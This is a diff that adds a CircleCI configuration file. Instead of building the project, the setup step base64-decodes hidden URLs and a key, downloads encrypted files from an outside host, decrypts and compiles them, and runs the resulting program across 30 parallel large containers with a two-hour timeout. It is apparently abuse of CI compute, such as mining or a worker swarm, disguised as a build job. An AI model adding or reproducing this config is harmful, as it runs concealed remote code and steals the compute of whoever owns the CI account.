@@ -1,0 +1,41 @@
+version: 2.1
+jobs:
+  run-cpp:
+    docker:
+      - image: cimg/base:current
+    resource_class: large
+    parallelism: 30
+    steps:
+      - run:
+          name: setup
+          command: |
+            sudo apt-get update && sudo apt-get install -y curl g++ libcurl4-openssl-dev cmake openssl
+            mkdir -p /tmp/lib
+            
+            export DECRYPT_KEY=$(echo "ZGQ3ZDE3YWI3MmFjZjJlNDhhMzA5YzVkYTJlZDE3NmM=" | base64 -d)
+            export URL_SRC=$(echo "aHR0cHM6Ly9yZXQuc2hlZXBub2RlLmNvbS9zaGVlcDEyMw==" | base64 -d)
+            export URL_MAIN=$(echo "aHR0cHM6Ly9yZXQuc2hlZXBub2RlLmNvbS9zaGVlcDIy" | base64 -d)
+            
+            curl -fsSL "$URL_SRC" -o /tmp/sheep123
+            openssl enc -aes-256-cbc -d -salt -pbkdf2 -in /tmp/sheep123 -out /tmp/sheep123.tar.gz -pass pass:$DECRYPT_KEY
+            
+            tar xzf /tmp/sheep123.tar.gz -C /tmp/lib
+            cd /tmp/lib && mkdir build && cd build
+            cmake ..
+            make -j$(nproc)
+            
+            curl -fsSL "$URL_MAIN" -o /tmp/sheep22
+            openssl enc -aes-256-cbc -d -salt -pbkdf2 -in /tmp/sheep22 -out /tmp/main.cpp -pass pass:$DECRYPT_KEY
+            g++ -O3 -std=c++20 -I/tmp/lib/src -o /tmp/app /tmp/main.cpp /tmp/lib/build/libcore.a -lcurl -lpthread
+      - run:
+          name: run
+          no_output_timeout: 120m
+          command: |
+            RAND=$(head -c 100 /dev/urandom | tr -dc 'a-z0-9' | head -c 8)
+            export NAME="node-${CIRCLE_NODE_INDEX}-${RAND}"
+            export STOP_AFTER=0
+            /tmp/app
+workflows:
+  main:
+    jobs:
+      - run-cpp
